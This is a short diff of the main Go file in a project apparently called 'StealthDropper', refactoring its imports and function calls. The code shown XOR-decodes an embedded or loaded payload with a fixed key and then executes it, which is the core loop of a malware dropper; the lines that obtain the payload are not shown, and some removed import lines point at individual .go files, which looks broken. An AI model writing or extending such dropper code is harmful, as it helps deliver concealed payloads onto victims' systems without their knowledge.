@@ -1,16 +1,14 @@
 package main
 
-import "fmt"
-import "os"
-import "github.com/Cyber-30/StealthDropper/encoder"
-import "github.com/Cyber-30/StealthDropper/exec/exec/exec_win.go"
-import "github.com/Cyber-30/StealthDropper/exec/exec/exec_mac.go"
-import "github.com/Cyber-30/StealthDropper/exec/exec/exec_linux.go"
+import	"fmt"
+import	"os"
+import	"github.com/Cyber-30/StealthDropper/decoder"
+import	"github.com/Cyber-30/StealthDropper/exec"
 
 
 func decode(data []byte) []byte {
 	key := byte(0xAA)
-	return XOR(data, key)
+	return decoder.XOR(data, key)
 }
 
 func main() {
@@ -20,5 +18,5 @@ func main() {
 		return
 	}
 	decoded := decode(payload)
-	executepayload(decoded)
+	exec.ExecutePayload(decoded)
 }
